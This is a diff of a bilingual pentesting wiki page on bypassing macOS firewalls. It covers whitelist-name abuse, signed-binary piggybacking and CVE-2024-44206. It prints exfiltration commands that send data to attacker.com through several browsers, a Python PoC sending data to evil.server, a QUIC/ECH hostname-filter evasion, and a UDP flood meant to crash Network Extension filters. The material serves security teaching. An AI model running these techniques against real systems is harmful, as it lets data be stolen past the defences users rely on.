@@ -1,40 +1,40 @@
-# macOS 绕过防火墙
+# macOS Bypassing Firewalls
 
 {{#include ../../banners/hacktricks-training.md}}
 
 ## 发现的技术
 
-以下技术在某些 macOS 防火墙应用中有效。
+以下技术已在某些 macOS firewall 应用中被证实可行。
 
-### 滥用白名单名称
+### Abusing whitelist names
 
-- 例如，使用 **`launchd`** 等知名 macOS 进程的名称调用恶意软件。
+- 例如将 malware 命名为知名的 macOS 进程名称，例如 **`launchd`**
 
-### 合成点击
+### Synthetic Click
 
-- 如果防火墙要求用户授权，让恶意软件 **点击允许**。
+- 如果 firewall 向用户请求权限，让 malware **点击“允许”**
 
-### **使用 Apple 签名的二进制文件**
+### **Use Apple signed binaries**
 
-- 像 **`curl`**，还有其他如 **`whois`**。
+- 比如 **`curl`**，也可以使用其他诸如 **`whois`**
 
-### 知名的苹果域名
+### Well known apple domains
 
-防火墙可能允许连接到知名的苹果域名，如 **`apple.com`** 或 **`icloud.com`**。iCloud 可以用作 C2。
+firewall 可能允许连接到知名的 apple 域名，例如 **`apple.com`** 或 **`icloud.com`**。iCloud 也可能被用作 C2。
 
-### 通用绕过
+### Generic Bypass
 
-一些尝试绕过防火墙的想法。
+一些尝试绕过 firewalls 的思路
 
-### 检查允许的流量
+### Check allowed traffic
 
-了解允许的流量将帮助您识别潜在的白名单域名或哪些应用程序被允许访问它们。
+了解被允许的流量将帮助你识别可能被列入白名单的域名，或哪些应用被允许访问它们。
 ```bash
 lsof -i TCP -sTCP:ESTABLISHED
 ```
 ### 滥用 DNS
 
-DNS 解析是通过 **`mdnsreponder`** 签名应用程序完成的，该应用程序可能被允许联系 DNS 服务器。
+DNS 解析是通过已签名的应用程序 **`mdnsreponder`** 完成的，该应用很可能被允许连接到 DNS 服务器。
 
 <figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>
 
@@ -49,11 +49,11 @@ make new document
 set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
 end tell
 ```
-- 谷歌浏览器
+- Google Chrome
 ```bash
 "Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
 ```
-- 火狐
+- Firefox
 ```bash
 firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
 ```
@@ -61,9 +61,10 @@ firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
 ```bash
 open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
 ```
-### 通过进程注入
+### Via processes injections
 
-如果你可以**将代码注入到一个可以连接到任何服务器的进程中**，你就可以绕过防火墙保护：
+If you can **inject code into a process** that is allowed to connect to any server you could bypass the firewall protections:
+
 
 {{#ref}}
 macos-proces-abuse/
@@ -73,29 +74,29 @@ macos-proces-abuse/
 
 ## 最近的 macOS 防火墙绕过漏洞 (2023-2025)
 
-### 网络内容过滤器（屏幕时间）绕过 – **CVE-2024-44206**
-在2024年7月，苹果修复了Safari/WebKit中的一个关键漏洞，该漏洞破坏了屏幕时间家长控制使用的系统范围内的“网络内容过滤器”。
-一个特别构造的URI（例如，带有双重URL编码的“://”）未被屏幕时间ACL识别，但被WebKit接受，因此请求未经过滤地发送出去。任何可以打开URL的进程（包括沙盒或未签名的代码）因此可以访问用户或MDM配置文件明确阻止的域。
+### Web content filter (Screen Time) bypass – **CVE-2024-44206**
+2024年7月，Apple 修补了 Safari/WebKit 中的一个关键漏洞，该漏洞破坏了由 Screen Time 家长控制使用的系统范围“网页内容过滤器”。
+一个特制的 URI（例如，带有双重 URL 编码的 “://”）不会被 Screen Time 的 ACL 识别，但会被 WebKit 接受，因此请求会未经过滤地发送。任何能够打开 URL 的进程（包括 sandboxed 或 unsigned code）因此可以访问用户或 MDM 配置文件明确阻止的域名。
 
-实际测试（未修补的系统）：
+Practical test (un-patched system):
 ```bash
 open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
 # if the patch is missing Safari will happily load the page
 ```
-### Packet Filter (PF) 规则排序漏洞在早期 macOS 14 “Sonoma”
-在 macOS 14 测试版周期中，Apple 在 **`pfctl`** 的用户空间包装中引入了一个回归。
-使用 `quick` 关键字添加的规则（许多 VPN 杀开关使用）被静默忽略，即使 VPN/防火墙 GUI 报告 *已阻止*，也会导致流量泄漏。该漏洞已被多个 VPN 供应商确认，并在 RC 2（构建 23A344）中修复。
+### Packet Filter (PF) 规则顺序漏洞（早期 macOS 14 “Sonoma”）
+在 macOS 14 的测试周期中，Apple 在围绕 **`pfctl`** 的用户空间包装器中引入了一个回归。
+使用 `quick` 关键字添加的规则（由许多 VPN kill-switches 使用）被静默忽略，导致流量 leaks，即使当 VPN/firewall GUI 报告为 *blocked*。该漏洞已由多家 VPN 供应商确认并在 RC 2（build 23A344）中修复。
 
-快速泄漏检查：
+快速 leak-check:
 ```bash
 pfctl -sr | grep quick       # rules are present…
 sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
 ```
-### 滥用苹果签名的辅助服务（遗留 - macOS 11.2 之前）
-在 macOS 11.2 之前，**`ContentFilterExclusionList`** 允许大约 50 个苹果二进制文件，如 **`nsurlsessiond`** 和 App Store，绕过所有使用网络扩展框架（LuLu、Little Snitch 等）实现的套接字过滤防火墙。
-恶意软件可以简单地生成一个被排除的进程——或向其中注入代码——并通过已经允许的套接字隧道其自己的流量。苹果在 macOS 11.2 中完全移除了排除列表，但该技术在无法升级的系统上仍然相关。
+### 滥用 Apple 签名的辅助服务（遗留 – pre-macOS 11.2）
+在 macOS 11.2 之前，**`ContentFilterExclusionList`** 允许大约 50 个 Apple 二进制文件，例如 **`nsurlsessiond`** 和 App Store，绕过所有通过 Network Extension framework 实现的 socket-filter 防火墙（如 LuLu、Little Snitch 等）。
+恶意软件可以简单地启动一个被排除的进程——或向其注入代码——并通过已被允许的 socket 将自己的流量隧道化。Apple 在 macOS 11.2 中已完全移除该排除列表，但在无法升级的系统上该技术仍然适用。
 
-示例概念验证（11.2 之前）：
+示例概念验证（pre-11.2）：
 ```python
 import subprocess, socket
 # Launch excluded App Store helper (path collapsed for clarity)
@@ -104,26 +105,59 @@ subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store
 s = socket.create_connection(("evil.server", 443))
 s.send(b"exfil...")
 ```
+### QUIC/ECH 绕过 Network Extension 域过滤 (macOS 12+)
+NEFilter Packet/Data Providers 依赖于 TLS ClientHello 中的 SNI/ALPN。使用 **HTTP/3 over QUIC (UDP/443)** 和 **Encrypted Client Hello (ECH)** 时，SNI 保持加密，NetExt 无法解析流量，主机名规则通常会 fail-open，允许 malware 在不接触 DNS 的情况下访问被阻止的域名。
+
+Minimal PoC:
+```bash
+# Chrome/Edge – force HTTP/3 and ECH
+/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
+--enable-quic --origin-to-force-quic-on=attacker.com:443 \
+--enable-features=EncryptedClientHello --user-data-dir=/tmp/h3test \
+https://attacker.com/payload
+
+# cURL 8.10+ built with quiche
+curl --http3-only https://attacker.com/payload
+```
+If QUIC/ECH is still enabled this is an easy hostname-filter evasion path.
+
+### macOS 15 “Sequoia” Network Extension 不稳定性（2024–2025）
+早期的 15.0/15.1 构建会导致第三方 **Network Extension** 过滤器（LuLu、Little Snitch、Defender、SentinelOne 等）崩溃。当过滤器重启时，macOS 会丢弃其流规则，许多产品会 fail‑open。用数千个短的 UDP flows 泛滥过滤器（或强制 QUIC/ECH）可以反复触发崩溃，并在 GUI 仍然声称防火墙正在运行时留下一个用于 C2/exfil 的窗口。
+
+Quick reproduction (safe lab box):
+```bash
+# create many short UDP flows to exhaust NE filter queues
+python3 - <<'PY'
+import socket, os
+for i in range(5000):
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+s.sendto(b'X'*32, ('1.1.1.1', 53))
+PY
+# watch for NetExt crash / reconnect loop
+log stream --predicate 'subsystem == "com.apple.networkextension"' --style syslog
+```
 ---
 
-## Tooling tips for modern macOS
+## 适用于现代 macOS 的工具提示
 
 1. 检查 GUI 防火墙生成的当前 PF 规则：
 ```bash
 sudo pfctl -a com.apple/250.ApplicationFirewall -sr
 ```
-2. 枚举已经持有 *outgoing-network* 权限的二进制文件（对搭便车很有用）：
+2. 枚举已经拥有 *outgoing-network* entitlement 的二进制文件（可用于搭便车）：
 ```bash
 codesign -d --entitlements :- /path/to/bin 2>/dev/null \
 | plutil -extract com.apple.security.network.client xml1 -o - -
 ```
-3. 以编程方式在 Objective-C/Swift 中注册您自己的网络扩展内容过滤器。
-一个最小的无根 PoC，可以将数据包转发到本地套接字，已在 Patrick Wardle 的 **LuLu** 源代码中提供。
+3. 使用 Objective-C/Swift 以编程方式注册你自己的 Network Extension content filter。
+A minimal rootless PoC that forwards packets to a local socket is available in Patrick Wardle’s **LuLu** source code.
 
 ## References
 
 - [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)
 - <https://nosebeard.co/advisories/nbl-001.html>
 - <https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html>
+- <https://www.securityweek.com/cybersecurity-products-conking-out-after-macos-sequoia-update/>
+- <https://learn.microsoft.com/en-us/defender-endpoint/network-protection-macos>
 
 {{#include ../../banners/hacktricks-training.md}}
